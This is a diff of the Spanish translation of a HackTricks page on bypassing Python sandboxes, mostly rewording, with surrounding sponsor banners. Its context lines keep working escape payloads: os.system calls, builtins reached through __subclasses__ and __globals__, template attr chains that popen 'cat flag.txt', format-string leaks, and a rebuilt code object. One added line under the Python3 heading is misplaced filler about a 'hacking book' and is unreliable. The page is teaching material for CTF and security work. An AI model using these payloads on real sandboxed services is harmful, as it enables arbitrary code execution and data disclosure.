@@ -14,8 +14,8 @@ Obtenga acceso hoy mismo:
 
 * ¿Trabaja en una **empresa de ciberseguridad**? ¿Quiere ver su **empresa anunciada en HackTricks**? ¿O quiere tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulte los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtenga el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
-* **Únase al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígame** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* Obtenga el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Únase al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígame** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Comparta sus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
@@ -24,7 +24,7 @@ Estos son algunos trucos para evitar las protecciones de sandbox de Python y eje
 
 ## Bibliotecas de ejecución de comandos
 
-Lo primero que debe saber es si puede ejecutar código directamente con alguna biblioteca ya importada, o si puede importar alguna de estas bibliotecas:
+Lo primero que debe saber es si puede ejecutar directamente código con alguna biblioteca ya importada, o si puede importar alguna de estas bibliotecas:
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -105,10 +105,10 @@ Puede descargar el paquete para crear la shell inversa aquí. Por favor, tenga e
 Este paquete se llama `Reverse`. Sin embargo, fue especialmente diseñado para que cuando salga de la shell inversa, el resto de la instalación fallará, por lo que **no dejará ningún paquete de Python adicional instalado en el servidor** cuando se vaya.
 {% endhint %}
 
-## Evaluar código de Python
+## Evaluar código Python
 
 {% hint style="warning" %}
-Tenga en cuenta que `exec` permite cadenas de varias líneas y ";", pero `eval` no (verificar el operador walrus)
+Tenga en cuenta que `exec` permite cadenas de varias líneas y ";", pero `eval` no (ver operador walrus)
 {% endhint %}
 
 Si ciertos caracteres están prohibidos, puede usar la representación **hex/octal/B64** para **burlar** la restricción:
@@ -168,7 +168,7 @@ def f(x):
     #+AAo-print(open("/flag.txt").read())
 """.lstrip()
 ```
-También es posible saltarse esto utilizando otras codificaciones, como `raw_unicode_escape` y `unicode_escape`.
+También es posible evadirlo utilizando otras codificaciones, por ejemplo, `raw_unicode_escape` y `unicode_escape`.
 
 ## Ejecución de Python sin llamadas
 
@@ -313,7 +313,7 @@ class X():
 __builtins__.__import__ = X
 {}[1337]
 ```
-### Leer archivo con la ayuda de builtins y la licencia
+### Leer archivo con ayuda de builtins y licencia
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
 a = __builtins__.help
@@ -325,8 +325,8 @@ with (a as b):
 ![](<../../../.gitbook/assets/image (9) (1) (2).png>)
 
 \
-Utiliza [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y automatizar fácilmente flujos de trabajo impulsados por las herramientas comunitarias más avanzadas del mundo.\
-Obtén acceso hoy mismo:
+Utilice [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas de la comunidad más avanzadas del mundo.\
+Obtenga acceso hoy:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
@@ -335,7 +335,7 @@ Obtén acceso hoy mismo:
 * [**Funciones integradas de python2**](https://docs.python.org/2/library/functions.html)
 * [**Funciones integradas de python3**](https://docs.python.org/3/library/functions.html)
 
-Si puedes acceder al objeto **`__builtins__`** puedes importar librerías (ten en cuenta que también podrías usar aquí otra representación de cadena mostrada en la última sección):
+Si puede acceder al objeto **`__builtins__`** puede importar bibliotecas (tenga en cuenta que también podría usar aquí otra representación de cadena mostrada en la última sección):
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
@@ -343,9 +343,9 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ### Sin Builtins
 
 Cuando no tienes `__builtins__`, no podrás importar nada ni siquiera leer o escribir archivos, ya que **todas las funciones globales** (como `open`, `import`, `print`...) **no están cargadas**.\
-Sin embargo, **por defecto Python importa muchos módulos en memoria**. Estos módulos pueden parecer inofensivos, pero algunos de ellos también importan funcionalidades peligrosas que pueden ser accedidas para obtener incluso **ejecución de código arbitrario**.
+Sin embargo, **por defecto, Python importa muchos módulos en memoria**. Estos módulos pueden parecer inofensivos, pero algunos de ellos también importan funcionalidades peligrosas que se pueden acceder para obtener incluso **ejecución de código arbitrario**.
 
-En los siguientes ejemplos se puede observar cómo **abusar** de algunos de estos módulos "**inofensivos**" cargados para **acceder** a **funcionalidades peligrosas** dentro de ellos.
+En los siguientes ejemplos, se puede observar cómo **abusar** de algunos de estos módulos "**inofensivos**" cargados para **acceder** a **funcionalidades peligrosas** dentro de ellos.
 
 **Python2**
 ```python
@@ -370,7 +370,7 @@ get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 ```
 #### Python3
 
-Python3
+El siguiente contenido es de un libro de hacking sobre técnicas de hacking. El siguiente contenido es del archivo generic-methodologies-and-resources/python/bypass-python-sandboxes/README.md.
 ```python
 # Obtain builtins from a globally defined function
 # https://docs.python.org/3/library/functions.html
@@ -385,7 +385,7 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**A continuación hay una función más grande**](./#recursive-search-of-builtins-globals) para encontrar decenas/**cientos** de **lugares** donde se pueden encontrar los **builtins**.
+[**A continuación hay una función más grande**](./#recursive-search-of-builtins-globals) para encontrar decenas/**cientos** de **lugares** donde puedes encontrar los **builtins**.
 
 #### Python2 y Python3
 ```python
@@ -429,13 +429,13 @@ class_obj.__init__.__globals__
 ```
 [**A continuación hay una función más grande**](./#recursive-search-of-builtins-globals) para encontrar decenas/**cientos** de **lugares** donde se pueden encontrar los **globales**.
 
-## Descubriendo la ejecución arbitraria
+## Descubriendo la Ejecución Arbitraria
 
 Aquí quiero explicar cómo descubrir fácilmente **funcionalidades más peligrosas cargadas** y proponer exploits más confiables.
 
 #### Accediendo a subclases con bypasses
 
-Una de las partes más sensibles de esta técnica es poder **acceder a las subclases base**. En los ejemplos anteriores se hizo esto usando `''.__class__.__base__.__subclasses__()` pero hay **otras formas posibles**:
+Una de las partes más sensibles de esta técnica es poder **acceder a las subclases base**. En los ejemplos anteriores se hizo esto usando `''.__class__.__base__.__subclasses__()`, pero hay **otras formas posibles**:
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
 "".__class__.__base__.__subclasses__()
@@ -460,9 +460,9 @@ defined_func.__class__.__base__.__subclasses__()
 (''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
 (''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
 ```
-### Encontrando librerías peligrosas cargadas
+### Encontrando bibliotecas peligrosas cargadas
 
-Por ejemplo, sabiendo que con la librería **`sys`** es posible **importar librerías arbitrarias**, puedes buscar todos los **módulos cargados que hayan importado sys dentro de ellos**:
+Por ejemplo, sabiendo que con la biblioteca **`sys`** es posible **importar bibliotecas arbitrarias**, puedes buscar todos los **módulos cargados que hayan importado sys dentro de ellos**:
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
@@ -678,17 +678,17 @@ def main():
 if __name__ == "__main__":
     main()
 ```
-Puedes revisar la salida de este script en esta página:
+Puedes verificar la salida de este script en esta página:
 
-{% content-ref url="output-searching-python-internals.md" %}
-[output-searching-python-internals.md](output-searching-python-internals.md)
+{% content-ref url="broken-reference" %}
+[Enlace roto](broken-reference)
 {% endcontent-ref %}
 
 ![](<../../../.gitbook/assets/image (9) (1) (2).png>)
 
 \
-Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas de la comunidad **más avanzadas del mundo**.\
-Obtén acceso hoy mismo:
+Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas de la comunidad **más avanzadas del mundo**.\
+Obtén acceso hoy:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
@@ -697,7 +697,7 @@ Obtén acceso hoy mismo:
 Si **envías** una **cadena** a Python que va a ser **formateada**, puedes usar `{}` para acceder a la **información interna de Python**. Puedes usar los ejemplos anteriores para acceder a los globales o a los builtins, por ejemplo.
 
 {% hint style="info" %}
-Sin embargo, hay una **limitación**, sólo puedes usar los símbolos `.[]`, por lo que **no podrás ejecutar código arbitrario**, sólo leer información.\
+Sin embargo, hay una **limitación**, solo puedes usar los símbolos `.[]`, por lo que **no podrás ejecutar código arbitrario**, solo leer información.\
 _**Si sabes cómo ejecutar código a través de esta vulnerabilidad, por favor contáctame.**_
 {% endhint %}
 ```python
@@ -719,9 +719,9 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Ten en cuenta que puedes **acceder a los atributos** de una manera normal con un **punto** como `people_obj.__init__` y los **elementos de un diccionario** con **paréntesis** sin comillas `__globals__[CONFIG]`.
+Tenga en cuenta que puede **acceder a los atributos** de una manera normal con un **punto** como `people_obj.__init__` y los **elementos del diccionario** con **paréntesis** sin comillas `__globals__[CONFIG]`.
 
-También puedes usar `.__dict__` para enumerar los elementos de un objeto `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
+También puede usar `.__dict__` para enumerar los elementos de un objeto `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
 Otras características interesantes de las cadenas de formato son la posibilidad de **ejecutar** las funciones **`str`**, **`repr`** y **`ascii`** en el objeto indicado agregando **`!s`**, **`!r`**, **`!a`** respectivamente:
 ```python
@@ -739,9 +739,17 @@ class HAL9000(object):
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**Más ejemplos** sobre **formato de cadena** se pueden encontrar en [**https://pyformat.info/**](https://pyformat.info)
+Se pueden encontrar **más ejemplos** sobre **formato de cadena** en [**https://pyformat.info/**](https://pyformat.info)
 
-### Cargas útiles de divulgación de información sensible
+{% hint style="danger" %}
+También revise la siguiente página para obtener gadgets que **leerán información confidencial de objetos internos de Python**:
+{% endhint %}
+
+{% content-ref url="../python-internal-read-gadgets.md" %}
+[python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
+{% endcontent-ref %}
+
+### Cargas útiles de divulgación de información confidencial
 ```python
 {whoami.__class__.__dict__}
 {whoami.__globals__[os].__dict__}
@@ -752,7 +760,7 @@ class HAL9000(object):
 # Access an element through several links
 {whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
 ```
-## Analizando Objetos de Python
+## Diseccionando Objetos de Python
 
 {% hint style="info" %}
 Si quieres **aprender** sobre **bytecode de Python** en profundidad, lee este **increíble** post sobre el tema: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
@@ -773,19 +781,7 @@ def get_flag(some_input):
 ```
 #### dir
 
-La función `dir()` devuelve una lista de nombres definidos en el ámbito actual. Si se proporciona un objeto como argumento, `dir()` lista los nombres definidos en ese objeto.
-
-Esta función es útil para explorar los objetos y módulos disponibles en un entorno de ejecución. También puede ser útil para encontrar nombres de funciones y atributos que no están documentados explícitamente.
-
-Ejemplo de uso:
-
-```python
->>> import os
->>> dir(os)
-['DirEntry', 'F_OK', 'MutableMapping', 'O_APPEND', 'O_BINARY', 'O_CREAT', 'O_EXCL', 'O_NOINHERIT', 'O_RANDOM', 'O_RDONLY', 'O_RDWR', 'O_SEQUENTIAL', 'O_SHORT_LIVED', 'O_TEMPORARY', 'O_TEXT', 'O_TRUNC', 'O_WRONLY', 'P_DETACH', 'P_NOWAIT', 'P_NOWAITO', 'P_...
-```
-
-En este ejemplo, se importa el módulo `os` y se utiliza `dir()` para listar los nombres definidos en ese módulo.
+La función `dir()` devuelve una lista de nombres definidos en el ámbito local o global. Si se proporciona un objeto como argumento, `dir()` devuelve los nombres definidos en ese objeto. Esta función es útil para explorar los objetos y módulos disponibles en un entorno de ejecución.
 ```python
 dir() #General dir() to find what we have loaded
 ['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
@@ -794,7 +790,7 @@ dir(get_flag) #Get info tof the function
 ```
 #### globals
 
-`__globals__` y `func_globals`(Igual) obtienen el entorno global. En el ejemplo se pueden ver algunos módulos importados, algunas variables globales y su contenido declarado:
+`__globals__` y `func_globals` (Iguales) obtienen el entorno global. En el ejemplo se pueden ver algunos módulos importados, algunas variables globales y su contenido declarado:
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -919,7 +915,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ```
 ## Compilando Python
 
-Ahora, imaginemos que de alguna manera puedes **volcar la información sobre una función que no puedes ejecutar** pero que **necesitas ejecutar**.\
+Ahora, imaginemos que de alguna manera puedes **volcar la información sobre una función que no puedes ejecutar** pero que **necesitas** **ejecutar**.\
 Como en el siguiente ejemplo, **puedes acceder al objeto de código** de esa función, pero solo leyendo el desensamblado **no sabes cómo calcular la bandera** (_imagina una función `calc_flag` más compleja_).
 ```python
 def get_flag(some_input):
@@ -955,7 +951,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 {% hint style="info" %}
-Dependiendo de la versión de Python, los **parámetros** de `code_type` pueden tener un **orden diferente**. La mejor manera de saber el orden de los parámetros en la versión de Python que estás ejecutando es ejecutar:
+Dependiendo de la versión de Python, los **parámetros** de `code_type` pueden tener un **orden diferente**. La mejor manera de conocer el orden de los parámetros en la versión de Python que está ejecutando es ejecutar:
 ```
 import types
 types.CodeType.__doc__
@@ -978,10 +974,10 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 #ThisIsTheFlag
 ```
-### Saltar defensas
+### Evadir Defensas
 
 En los ejemplos anteriores al comienzo de esta publicación, se puede ver **cómo ejecutar cualquier código de Python usando la función `compile`**. Esto es interesante porque se puede **ejecutar scripts completos** con bucles y todo en una **sola línea** (y podríamos hacer lo mismo usando **`exec`**).\
-De todas maneras, a veces podría ser útil **crear** un **objeto compilado** en una máquina local y ejecutarlo en la **máquina CTF** (por ejemplo, porque no tenemos la función `compiled` en la CTF).
+De todos modos, a veces podría ser útil **crear** un **objeto compilado** en una máquina local y ejecutarlo en la **máquina CTF** (por ejemplo, porque no tenemos la función `compiled` en la CTF).
 
 Por ejemplo, compilamos y ejecutamos manualmente una función que lee _./poc.py_:
 ```python
@@ -1058,7 +1054,7 @@ def check_permission(super_user):
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
@@ -1066,7 +1062,7 @@ def check_permission(super_user):
 ![](<../../../.gitbook/assets/image (9) (1) (2).png>)
 
 \
-Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas de la comunidad **más avanzadas del mundo**.\
+Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas de la comunidad más avanzadas del mundo.\
 Obtén acceso hoy:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
